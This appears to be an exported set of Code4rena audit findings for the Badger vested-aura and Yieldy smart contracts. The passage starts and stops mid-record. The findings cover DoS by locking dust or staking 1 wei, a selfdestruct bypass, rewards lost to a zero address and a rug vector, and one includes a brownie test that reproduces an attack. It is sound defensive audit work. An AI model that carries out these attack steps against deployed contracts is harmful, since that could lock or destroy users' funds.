\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 multipleRequire    \u2506 270             \u2506 270 \u2506 270    \u2506 270 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f  ```  ### Lines - MyStrategy.sol:185   --- ## Use assembly to check for address(0)  ```js   contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public view {         c0.ownerNotZero(address(this));         c1.assemblyOwnerNotZero(address(this));     } }  contract Contract0 {     function ownerNotZero(address _addr) public pure {         require(_addr != address(0), \"zero address)\");     } }  contract Contract1 {     function assemblyOwnerNotZero(address _addr) public pure {         assembly {             if iszero(_addr) {                 mstore(0x00, \"zero address\")                 revert(0x00, 0x20)             }         }     } }   ```  ### Gas Report  ```js \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract0 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 61311              \u2506 338             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 ownerNotZero       \u2506 258             \u2506 258 \u2506 258    \u2506 258 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract1 contract   \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost      \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 44893                \u2506 255             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name        \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 assemblyOwnerNotZero \u2506 252             \u2506 252 \u2506 252    \u2506 252 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f ```  ### Lines - MyStrategy.sol:290   --- "}, {"title": "auraBAL can be stuck into the Strategy contract", "html_url": "https://github.com/code-423n4/2022-06-badger-findings/issues/129", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "valid"], "target": "2022-06-badger-findings", "body": "# Lines of code  https://github.com/Badger-Finance/vested-aura/blob/v0.0.2/contracts/MyStrategy.sol#L220-L228 https://github.com/Badger-Finance/vested-aura/blob/v0.0.2/contracts/MyStrategy.sol#L288   # Vulnerability details  ## Impact The internal `_harvest()` function defined is responsible to claim auraBAL from the aura locker and within the function it swaps them to auraBAL -> BAL/ETH BPT -> WETH -> AURA, finally it locks AURA to the locker to increase the position. For claiming auraBAL it calls `LOCKER.getReward(address(this))` and it calculates the tokes earned, checking the balance before and after the claiming.  The function to get the rewards is public and any address can call it for the strategy address, and it will transfer all rewards tokens to the strategy, but in this scenario the auraBAL will remain in stuck into the contract, because they won't be counted as auraBAL earned during the next `_harvest()`. Also they could not sweep because auraBAL is a protected token.  Also, the aura Locker will be able to add other token as reward apart of auraBAL, but the harvest function won't be able to manage them, so they will need to be sweep every time.  The same scenario can happen during the `claimBribesFromHiddenHand()` call, the `IRewardDistributor.Claim[] calldata _claims` pass as input parameters could be frontrunned, and another address can call the `hiddenHandDistributor.claim(_claims)` (except for ETH rewards) for the strategy address, and like during the `_harvest()` only the tokens received during the call will be counted as earned. However every token, except auraBAL can be sweep, but the `_notifyBribesProcessor()` may never be called.  ## Proof of Concept At every `_harvest()` it checks the balance before the claim and after, to calculate the auraBAL earned, so every auraBAL transferred to the strategy address not during this call, won't be swapped to AURA.   ## Recommended Mitigation Steps Instead of calculating the balance before and after the claim, for both `harvest\u2260 and `claimBribesFromHiddenHand()`, the whole balance could be taken, directly after the claim.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-badger-findings/issues/127", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-badger-findings", "body": "### Condition in `receive` function can be bypassed with self-destruct of another contract  **Details**: The logic in [L436-L438](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L436-L438) implies that the contract should only receive ether if `isClaimingBribes` is `true`. However, this check can be bypassed by deploying a contract (say, Attacker) and setting up the address of MyStrategy contract as the destination of a\u00a0`selfdestruct` in the Attacker contract \u2014 for more information and otherway to bypass the require of [L437](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L437), see [this link](https://docs.soliditylang.org/en/latest/contracts.html#receive-ether-function).  **Impact**: Informational (could possibly break internal calculations of the protocol though)  ### **Re-entrancy guard upgradeable contract is not initialized**  **Details**: As stated in OpenZeppelin [docs](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#:~:text=When%20writing%20an%20initializer%2C%20you%20need%20to%20take%20special%20care%20to%20manually%20call%20the%20initializers%20of%20all%20parent%20contracts), \u201cwhen writing an initializer, you need to take special care to manually call the initializers of all parent contracts\u201d. However, the initializer of `ReentrancyGuardUpgradeable` is not called.  **Mitigation**: Ensure that all necessary functions are inherited from the upgradeable contracts.  **Impact**: Code QA  ### TODOs are left in comments  **Details**: In [L284](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L284) and [L422](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L422) of ****MyStrategy.sol**** there are comments with TODOs. These should be resolved and removed from the code before deployment.  **Mitigation**: Check the TODOs and fix/remove them.  **Impact**: Code QA  ### Usage of deprecated function safeApprove  **Details**: In [L65-68](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L65-L68) of ****MyStrategy.sol**** the function `safeApprove` from OpenZeppelin contracts are used, however these functions have been deprecated according to [OpenZeppelin 3.x docs](https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#SafeERC20-safeApprove-contract-IERC20-address-uint256-) (note that ****MyStrategy.sol**** correctly use OpenZeppelin 3.4.0).  **Impact**: Code QA  ### Alert developers that OpenZeppelin contract cannot be bumped to 4.x  **Note to judges**: I think this issue is out-of-scope, but worthy to inform anyway \ud83d\ude42  **Details**: According to [brownie config file](https://github.com/Badger-Finance/vested-aura/blob/v0.0.2/brownie-config.yaml), the contract **MyStrategy.sol** imports version 3.4.0 of OpenZeppelin\u2019s SafeMath, and this is the recommend version to use with Solidity 0.6.12.  Unware developers, however, may want to bump OpenZeppelin version to the lastest one, and running `brownie compile` will compile the contract without errors (at least for 4.6.0). However, as alerted by the comments in [L6-8](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/51e11611c40ec1ad772e2a075cdc8487bbadf8ad/contracts/utils/math/SafeMathUpgradeable.sol#L6-L8), recent versions of SafeMath *should only be used with Solidity 0.8 or later, because it relies on the compiler's built in overflow checks*. This implies that checks of overflow/underflow will not be used, and this could be further exploited in other attacks.   This could also be particularly dangerous in the scenario wherein a developer does this bumping while writing his own MyStrategy contract, since he will probably use the SafeMath functions assuming that underflow/overflow checks are being used in his code.  **Mitigation**: Consider adding a comment in brownie config file alerting the users that OpenZeppelin version should not be bumped.  **Impact**: Informational (probably out-of-scope)"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-badger-findings/issues/114", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-badger-findings", "body": "[GAS - 01] In `claimBribesFromHiddenHand`, `token` could be reused  The same external call is made twice:  https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L318 https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L301  Therefore gas could saved using a memory array to avoid doing the same external call twice."}, {"title": "Badger rewards from Hidden Hand can permanently prevent Strategy from receiving bribes", "html_url": "https://github.com/code-423n4/2022-06-badger-findings/issues/111", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-06-badger-findings", "body": "# Lines of code  https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L428-L430 https://github.com/Badger-Finance/badger-vaults-1.5/blob/3c96bd83e9400671256b235422f63644f1ae3d2a/contracts/BaseStrategy.sol#L351 https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L407-L408   # Vulnerability details  ## Impact If the contract receives rewards from the hidden hand marketplace in BADGER then the contract tries to transfer the same amount of tokens twice to two different accounts, once with `_sendBadgerToTree()` in `MyStrategy` and again with `_processExtraToken()` in the `BasicStrategy` contract. As it is very likely that the strategy will not start with any BADGER tokens, the second transfer will revert (as we are using safeTransfer). This means that `claimBribesFromHiddenHand()` will always revert preventing any other bribes from being received. ## Proof of Concept 1. `claimBribesFromHiddenHand()` is called by strategist 2. Multiple bribes are sent to the strategy including BADGER. For example lets say 50 USDT And 50 BADGER 3. Strategy receives BADGER and calls `_handleRewardTransfer()` which calls `_sendBadgerToTree()`. 50 BADGER is sent to the Badger Tree so balance has dropped to 0. 4. 50 Badger is then again sent to Vault however balance is 0 so the command fails and reverts 5. No more tokens can be claimed anymore  ## Tools Used VS Code ## Recommended Mitigation Steps `_processExtraToken()` eventually sends the badger to the badger tree through the `Vault` contract. Change ```     function _sendBadgerToTree(uint256 amount) internal {         IERC20Upgradeable(BADGER).safeTransfer(BADGER_TREE, amount);         _processExtraToken(address(BADGER), amount);     } ``` to ```     function _sendBadgerToTree(uint256 amount) internal {         _processExtraToken(address(BADGER), amount);     } ```  "}, {"title": "Withdrawing all funds at once to vault can be DoS attacked by frontrunning and locking dust", "html_url": "https://github.com/code-423n4/2022-06-badger-findings/issues/92", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "valid"], "target": "2022-06-badger-findings", "body": "# Lines of code  https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L184-L187   # Vulnerability details  ## Impact  All funds can be migrated (withdrawn) at once to the caller vault by using the `BaseStrategy.withdrawToVault` function which internally calls `MyStrategy._withdrawAll`.  The latter function has the following check in place:  [MyStrategy.sol#L184-L187](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L184-L187)  ```solidity require(     balanceOfPool() == 0 && LOCKER.balanceOf(address(this)) == 0,     \"You have to wait for unlock or have to manually rebalance out of it\" ); ```  Funds can only be withdrawn (migrated) if the balance in `LOCKER` is fully unlocked.  By locking a small amount of want tokens via `AuraLocker.lock` with the `strategy` address, a malicious individual can cause DoS and prevent withdrawing and migrating funds to the vault.  ## Proof of Concept  The following test case will replicate the DoS attack by locking \"dust\" want tokens for the `strategy` address. This causes `vault.withdrawToVault` to revert.  ```python def test_frontrun_migration(locker, deployer, vault, strategy, want, governance, keeper):     # Setup     randomUser = accounts[6]     snap = SnapshotManager(vault, strategy, \"StrategySnapshot\")      startingBalance = want.balanceOf(deployer)     depositAmount = startingBalance // 2     assert startingBalance >= depositAmount     # End Setup      # Deposit     want.approve(vault, MaxUint256, {\"from\": deployer})     snap.settDeposit(depositAmount, {\"from\": deployer})      chain.sleep(15)     chain.mine()      vault.earn({\"from\": keeper})      chain.snapshot()      # Test no harvests     chain.sleep(86400 * 250)  ## Wait 250 days so we can withdraw later     chain.mine()      before = {\"settWant\": want.balanceOf(vault), \"stratWant\": strategy.balanceOf()}      strategy.prepareWithdrawAll({\"from\": governance})      want.approve(locker, 1, {\"from\": deployer})     locker.lock(strategy, 1, { \"from\": deployer }) # Donate \"dust\" want tokens to strategy      vault.withdrawToVault({\"from\": governance}) # @audit-info reverts with \"You have to wait for unlock or have to manually rebalance\"      after = {\"settWant\": want.balanceOf(vault), \"stratWant\": strategy.balanceOf()}      assert after[\"settWant\"] > before[\"settWant\"]     assert after[\"stratWant\"] < before[\"stratWant\"]     assert after[\"stratWant\"] == 0 ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Call `LOCKER.processExpiredLocks(false);` in `MyStrategy._withdrawAll` directly and remove the check which enforces unlocking all want tokens on L184-L187.   "}, {"title": "attacker can call sweepRewardToken() when `bribesProcessor==0` and reward funds will be lost because there is no check in sweepRewardToken() and _handleRewardTransfer() and _sendTokenToBribesProcessor()", "html_url": "https://github.com/code-423n4/2022-06-badger-findings/issues/18", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "valid"], "target": "2022-06-badger-findings", "body": "# Lines of code  https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L107-L113 https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L405-L413 https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L421-L425   # Vulnerability details  ## Impact If the value of `bribesProcessor` was `0x0` (the default is `0x0` and `governance()`  can set to `0x0`) then attacker can call `sweepRewardToken()` make contract to send his total balance in attacker specified token to `0x0` address.  ## Proof of Concept the default value of `bribesProcessor` is `0x0` and `governance` can set the value to `0x0` at any time. rewards are stacking in contract address and they are supposed to send to `bribesProcessor`. This is `sweepRewardToken()` and `_handleRewardTransfer()` and `_sendTokenToBribesProcessor()` code: ```   /// @dev Function to move rewards that are not protected   /// @notice Only not protected, moves the whole amount using _handleRewardTransfer   /// @notice because token paths are hardcoded, this function is safe to be called by anyone   /// @notice Will not notify the BRIBES_PROCESSOR as this could be triggered outside bribes   function sweepRewardToken(address token) public nonReentrant {       _onlyGovernanceOrStrategist();       _onlyNotProtectedTokens(token);        uint256 toSend = IERC20Upgradeable(token).balanceOf(address(this));       _handleRewardTransfer(token, toSend);   }    function _handleRewardTransfer(address token, uint256 amount) internal {       // NOTE: BADGER is emitted through the tree       if (token == BADGER) {           _sendBadgerToTree(amount);       } else {           // NOTE: All other tokens are sent to bribes processor           _sendTokenToBribesProcessor(token, amount);       }   }    function _sendTokenToBribesProcessor(address token, uint256 amount) internal {       // TODO: Too many SLOADs       IERC20Upgradeable(token).safeTransfer(address(bribesProcessor), amount);       emit RewardsCollected(token, amount);   } ``` As you can see calling `sweepRewardToken()` eventually (`sweepRewardToken() -> _handleRewardTransfer() -> _sendTokenToBribesProcessor()`) would transfer reward funds to `bribesProcessor` and there is no check that `bribesProcessor!=0x0` in execution follow. so attacker can call `sweepRewardToken()` when `bribesProcessor` is `0x0` and contract will lose all reward tokens.   ## Tools Used VIM  ## Recommended Mitigation Steps check the value of `bribesProcessor` in `_sendTokenToBribesProcessor()`  "}, {"title": "Functions in the `BatchRequests` contract revert for removed contract addresses", "html_url": "https://github.com/code-423n4/2022-06-yieldy-findings/issues/283", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-yieldy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-yieldy/blob/524f3b83522125fb7d4677fa7a7e5ba5a2c0fe67/src/contracts/BatchRequests.sol#L50-L59 https://github.com/code-423n4/2022-06-yieldy/blob/524f3b83522125fb7d4677fa7a7e5ba5a2c0fe67/src/contracts/BatchRequests.sol#L33-L44   # Vulnerability details  ## Impact  Removing Yieldy contract addresses from the `contracts` array with `BatchRequests.removeAddress` replaces the contract address with a zero-address (due to how `delete` works).  Each function that loops over the `contracts` array or accesses an array item by index, should zero-address check the value before calling any external contract functions. If this zero-address check is missing, an external call to this zero-address will revert.  ## Proof of Concept  [BatchRequests.canBatchContractByIndex](https://github.com/code-423n4/2022-06-yieldy/blob/524f3b83522125fb7d4677fa7a7e5ba5a2c0fe67/src/contracts/BatchRequests.sol#L50-L59)  ```solidity function canBatchContractByIndex(uint256 _index)     external     view     returns (address, bool) {     return (         contracts[_index],         IStaking(contracts[_index]).canBatchTransactions() // @audit-info `contracts` with zero-address elements (due to deletion) will revert - add zero-address check and return false     ); } ```  [BatchRequests.canBatchContracts](https://github.com/code-423n4/2022-06-yieldy/blob/524f3b83522125fb7d4677fa7a7e5ba5a2c0fe67/src/contracts/BatchRequests.sol#L33-L44)  ```solidity function canBatchContracts() external view returns (Batch[] memory) {     uint256 contractsLength = contracts.length;     Batch[] memory batch = new Batch[](contractsLength);     for (uint256 i; i < contractsLength; ) {         bool canBatch = IStaking(contracts[i]).canBatchTransactions(); // @audit-info `contracts` with zero-address elements (due to deletion) will revert - add zero-address check         batch[i] = Batch(contracts[i], canBatch);         unchecked {             ++i;         }     }     return batch; } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Add zero-address checks to both mentioned functions.   "}, {"title": "`_storeRebase()` is called with the wrong parameters", "html_url": "https://github.com/code-423n4/2022-06-yieldy-findings/issues/259", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-yieldy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-yieldy/blob/524f3b83522125fb7d4677fa7a7e5ba5a2c0fe67/src/contracts/Yieldy.sol#L110-L114 https://github.com/code-423n4/2022-06-yieldy/blob/524f3b83522125fb7d4677fa7a7e5ba5a2c0fe67/src/contracts/Yieldy.sol#L97-L100   # Vulnerability details  `_storeRebase()`'s signature is as such:  - [Yieldy.sol#_storeRebase()](https://github.com/code-423n4/2022-06-yieldy/blob/524f3b83522125fb7d4677fa7a7e5ba5a2c0fe67/src/contracts/Yieldy.sol#L110-L114)  ```solidity File: Yieldy.sol 104:     /** 105:         @notice emits event with data about rebase 106:         @param _previousCirculating uint 107:         @param _profit uint 108:         @param _epoch uint 109:      */ 110:     function _storeRebase( 111:         uint256 _previousCirculating, 112:         uint256 _profit, 113:         uint256 _epoch 114:     ) internal { ```  However, instead of being called with the expected `_previousCirculating` value, it's called with the current circulation value:  - [Yieldy.sol#rebase()](https://github.com/code-423n4/2022-06-yieldy/blob/524f3b83522125fb7d4677fa7a7e5ba5a2c0fe67/src/contracts/Yieldy.sol#L97-L100)  ```solidity File: Yieldy.sol 89:             uint256 updatedTotalSupply = currentTotalSupply + _profit; ... 103:             _totalSupply = updatedTotalSupply; 104:  105:             _storeRebase(updatedTotalSupply, _profit, _epoch); // @audit-info this should be currentTotalSupply otherwise previous = current ```  As a consequence, the functionality isn't doing what it was created for.  ## Mitigation  Consider calling `_storeRebase()` with `currentTotalSupply`:  ```diff File: Yieldy.sol - 105:             _storeRebase(updatedTotalSupply, _profit, _epoch); + 105:             _storeRebase(currentTotalSupply, _profit, _epoch); ```   "}, {"title": "`Staking.sol#stake()` DoS by staking 1 wei for the recipient when `warmUpPeriod > 0`", "html_url": "https://github.com/code-423n4/2022-06-yieldy-findings/issues/187", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "upgraded by judge"], "target": "2022-06-yieldy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-yieldy/blob/524f3b83522125fb7d4677fa7a7e5ba5a2c0fe67/src/contracts/Staking.sol#L435-L447   # Vulnerability details  ```solidity if (warmUpPeriod == 0) {     IYieldy(YIELDY_TOKEN).mint(_recipient, _amount); } else {     // create a claim and mint tokens so a user can claim them once warm up has passed     warmUpInfo[_recipient] = Claim({         amount: info.amount + _amount,         credits: info.credits +             IYieldy(YIELDY_TOKEN).creditsForTokenBalance(_amount),         expiry: epoch.number + warmUpPeriod     });      IYieldy(YIELDY_TOKEN).mint(address(this), _amount); } ```  `Staking.sol#stake()` is a public function and you can specify an arbitrary address as the `_recipient`.  When `warmUpPeriod > 0`, with as little as 1 wei of `YIELDY_TOKEN`, the `_recipient`'s `warmUpInfo` will be push back til `epoch.number + warmUpPeriod`.  ### Recommendation  Consider changing to not allow deposit to another address when `warmUpPeriod > 0`.  "}, {"title": "Staking `preSign` could use some basic validations", "html_url": "https://github.com/code-423n4/2022-06-yieldy-findings/issues/172", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-yieldy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-yieldy/blob/524f3b83522125fb7d4677fa7a7e5ba5a2c0fe67/src/contracts/Staking.sol#L769   # Vulnerability details  The function `preSign` acceps any `orderUid` `function preSign(bytes calldata orderUid) external onlyOwner`  Because of how Cowswap works, accepting any `orderUid` can be used as a rug-vector.  This is because the orderData contains a `receiver` which in lack of validation could be any address.  You'd also be signing other parameters such as minOut and how long the order could be filled for, which you may or may not want to validate to give stronger security guarantees to end users.   ## Recomended mitigation steps I'd recommend adding basic validation for tokenOut, minOut and receiver.  Feel free to check the work we've done at Badger to validate order parameters, giving way stronger guarantees to end users. https://github.com/GalloDaSballo/fair-selling/blob/44c0c0629289a0c4ccb3ca971cc5cd665ce5cb82/contracts/CowSwapSeller.sol#L194  Also notice how through the code above we are able to re-construct the `orderUid`, feel free to re-use that code which has been validated by the original Cowswap / GPv2 Developers  "}, {"title": "Staking: the rebase function needs to be called before calling the function in the Yieldy contract that uses the rebasingCreditsPerToken variable", "html_url": "https://github.com/code-423n4/2022-06-yieldy-findings/issues/126", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-yieldy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-yieldy/blob/524f3b83522125fb7d4677fa7a7e5ba5a2c0fe67/src/contracts/Staking.sol#L674-L696   # Vulnerability details  ## Impact In the Yieldy contract, functions such as balanceOf/creditsForTokenBalance/tokenBalanceForCredits/transfer/transferFrom/burn/mint will use the rebasingCreditsPerToken variable, so before calling these functions in the Staking contract, make sure that the rebase of this epoch has occurred. Therefore, the rebase function should also be called in the unstake/claim/claimWithdraw function of the Staking contract. ## Proof of Concept 